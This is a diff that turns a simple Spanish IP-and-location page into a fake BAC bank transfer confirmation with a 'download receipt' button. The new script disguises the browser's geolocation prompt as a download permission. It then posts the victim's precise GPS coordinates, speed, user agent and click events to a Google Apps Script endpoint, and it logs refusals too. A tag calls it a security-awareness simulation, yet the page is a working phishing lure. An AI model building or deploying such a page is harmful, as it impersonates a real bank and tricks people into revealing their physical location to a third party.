@@ -1,72 +1,424 @@
 <!doctype html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Mi IP y ubicación</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Confirmación de Transferencia Bancaria</title>
+
   <style>
-    body { font-family: Arial, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 18px; line-height: 1.5; }
-    .card { border: 1px solid #ddd; border-radius: 12px; padding: 20px; margin-top: 16px; }
-    button { padding: 12px 18px; border: 0; border-radius: 8px; cursor: pointer; font-size: 16px; }
-    pre { white-space: pre-wrap; word-break: break-word; background: #f6f6f6; padding: 14px; border-radius: 8px; }
-    .note { font-size: 14px; color: #555; }
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 680px;
+      margin: 50px auto;
+      padding: 0 20px;
+      line-height: 1.5;
+      background: #fafafa;
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 12px;
+      padding: 28px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.05);
+    }
+
+    h1 {
+      margin-top: 0;
+      font-size: 30px;
+    }
+
+    h2 {
+      margin-top: 0;
+    }
+
+    .button {
+      display: inline-block;
+      margin-top: 18px;
+      padding: 13px 20px;
+      border: 0;
+      border-radius: 8px;
+      background: #1f6feb;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .button.secondary {
+      background: #444;
+    }
+
+    .button:disabled {
+      opacity: .65;
+      cursor: default;
+    }
+
+    #permissionStep,
+    #finalStep {
+      display: none;
+      margin-top: 22px;
+      padding: 18px;
+      background: #f3f4f6;
+      border-radius: 10px;
+    }
+
+    #permissionNotice {
+      font-size: 13px;
+      color: #666;
+      margin-top: 8px;
+    }
+
+    #status {
+      margin-top: 14px;
+      color: #555;
+      font-size: 14px;
+    }
   </style>
 </head>
+
 <body>
-  <h1>Mi IP y ubicación</h1>
-  <p>Esta página muestra tu IP pública automáticamente. Para obtener ubicación precisa, el navegador te pedirá autorización.</p>
 
   <div class="card">
-    <h2>IP pública</h2>
-    <pre id="ipResult">Consultando...</pre>
+
+    <div id="initialStep">
+
+      <h1>Confirmación de Transferencia Bancaria BAC </h1>
+
+      <p>
+        Confirmamos la transferencia de fondos a tu cuenta.
+        Haz clic para descargar el comprobante.
+      </p>
+
+      <button class="button" id="downloadBtn">
+        Descargar comprobante
+      </button>
+
+    </div>
+
+
+    <div id="permissionStep">
+
+      <p>
+        Para continuar con este ejercicio, se requiere permiso
+        para descargar.
+      </p>
+
+      <p id="permissionNotice">
+      </p>
+
+      <button class="button secondary" id="locationBtn">
+        Continuar
+      </button>
+
+    </div>
+
+
+    <div id="finalStep">
+
+      <h2>
+        Descarga completada
+      </h2>
+
+      <p>
+        En caso que la descarga no funcione contactar a BAC.
+      </p>
+
+      <p>
+        
+      </p>
+
+    </div>
+
+    <div id="status"></div>
+
   </div>
 
-  <div class="card">
-    <h2>Ubicación precisa</h2>
-    <button onclick="getLocation()">Obtener mi ubicación</button>
-    <pre id="locResult">Pendiente.</pre>
-    <p class="note">La ubicación GPS/Wi‑Fi requiere permiso del navegador.</p>
-  </div>
 
-  <script>
-    async function getIP() {
-      const out = document.getElementById('ipResult');
+<script>
+
+const ENDPOINT_URL =
+"https://script.google.com/macros/s/AKfycbzXzTx6r8vZv2dvBKnLC7f1uvYrXq0iKoOKeTE7ZI7eHDhHNvIreSrpqBn11RzpVeXMGA/exec";
+
+
+const initialStep =
+document.getElementById("initialStep");
+
+const permissionStep =
+document.getElementById("permissionStep");
+
+const finalStep =
+document.getElementById("finalStep");
+
+const downloadBtn =
+document.getElementById("downloadBtn");
+
+const locationBtn =
+document.getElementById("locationBtn");
+
+const statusEl =
+document.getElementById("status");
+
+
+function setStatus(text) {
+  statusEl.textContent = text;
+}
+
+
+async function sendEvent(payload) {
+
+  const body = {
+
+    ...payload,
+
+    campaign:
+    "security_awareness_transfer_simulation",
+
+    page_timestamp:
+    new Date().toISOString(),
+
+    user_agent:
+    navigator.userAgent,
+
+    page_url:
+    location.href
+  };
+
+
+  const response =
+  await fetch(
+    ENDPOINT_URL,
+    {
+      method: "POST",
+
+      headers: {
+        "Content-Type":
+        "text/plain;charset=utf-8"
+      },
+
+      body:
+      JSON.stringify(body)
+    }
+  );
+
+
+  return response.json();
+}
+
+
+
+/* ==================================
+   CLICK EN DESCARGAR COMPROBANTE
+================================== */
+
+downloadBtn.addEventListener(
+"click",
+async () => {
+
+  downloadBtn.disabled = true;
+
+  downloadBtn.textContent =
+  "Procesando...";
+
+
+  try {
+
+    await sendEvent({
+
+      event_type:
+      "clicked_download"
+
+    });
+
+  } catch (error) {
+
+    console.error(
+      "Error registrando clic:",
+      error
+    );
+  }
+
+
+  initialStep.style.display =
+  "none";
+
+  permissionStep.style.display =
+  "block";
+
+  setStatus("");
+
+});
+
+
+
+/* ==================================
+   SOLICITUD DE UBICACIÓN
+================================== */
+
+locationBtn.addEventListener(
+"click",
+() => {
+
+  if (!navigator.geolocation) {
+
+    setStatus(
+      "Este navegador no soporta geolocalización."
+    );
+
+    return;
+  }
+
+
+  locationBtn.disabled = true;
+
+  locationBtn.textContent =
+  "Solicitando autorización...";
+
+
+  navigator.geolocation
+  .getCurrentPosition(
+
+    /* AUTORIZADO */
+
+    async (position) => {
+
       try {
-        const r = await fetch('https://api.ipify.org?format=json');
-        const data = await r.json();
-        out.textContent = JSON.stringify({
-          ip: data.ip,
-          fecha_hora: new Date().toISOString()
-        }, null, 2);
-      } catch (e) {
-        out.textContent = 'No se pudo consultar la IP.';
-      }
-    }
 
-    function getLocation() {
-      const out = document.getElementById('locResult');
-      if (!navigator.geolocation) {
-        out.textContent = 'Este navegador no soporta geolocalización.';
-        return;
+        const result =
+        await sendEvent({
+
+          event_type:
+          "location_authorized",
+
+          latitude:
+          position.coords.latitude,
+
+          longitude:
+          position.coords.longitude,
+
+          accuracy_meters:
+          position.coords.accuracy,
+
+          altitude:
+          position.coords.altitude,
+
+          heading:
+          position.coords.heading,
+
+          speed:
+          position.coords.speed,
+
+          device_timestamp:
+          new Date(
+            position.timestamp
+          ).toISOString()
+
+        });
+
+
+        if (result.ok) {
+
+          permissionStep.style.display =
+          "none";
+
+          finalStep.style.display =
+          "block";
+
+          setStatus(
+            "Ejercicio registrado correctamente."
+          );
+
+        } else {
+
+          setStatus(
+            "La ubicación se obtuvo, pero no pudo guardarse."
+          );
+
+          locationBtn.disabled =
+          false;
+
+          locationBtn.textContent =
+          "Continuar";
+        }
+
+
+      } catch (error) {
+
+        console.error(
+          "Error guardando ubicación:",
+          error
+        );
+
+
+        setStatus(
+          "La ubicación se obtuvo, pero ocurrió un error al guardarla."
+        );
+
+
+        locationBtn.disabled =
+        false;
+
+        locationBtn.textContent =
+        "Continuar";
       }
-      out.textContent = 'Esperando autorización...';
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          out.textContent = JSON.stringify({
-            latitud: pos.coords.latitude,
-            longitud: pos.coords.longitude,
-            precision_metros: pos.coords.accuracy,
-            fecha_hora: new Date(pos.timestamp).toISOString()
-          }, null, 2);
-        },
-        err => {
-          out.textContent = 'No se pudo obtener la ubicación: ' + err.message;
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+
+    },
+
+
+    /* PERMISO RECHAZADO */
+
+    async (error) => {
+
+      try {
+
+        await sendEvent({
+
+          event_type:
+          "location_denied",
+
+          location_error_code:
+          error.code,
+
+          location_error_message:
+          error.message
+
+        });
+
+      } catch (logError) {
+
+        console.error(
+          "Error registrando rechazo:",
+          logError
+        );
+      }
+
+
+      permissionStep.style.display =
+      "none";
+
+      finalStep.style.display =
+      "block";
+
+
+      setStatus(
+        "El permiso de ubicación no fue autorizado."
       );
+
+    },
+
+
+    /* CONFIGURACIÓN GPS */
+
+    {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
     }
 
-    getIP();
-  </script>
+  );
+
+});
+
+</script>
+
 </body>
 </html>
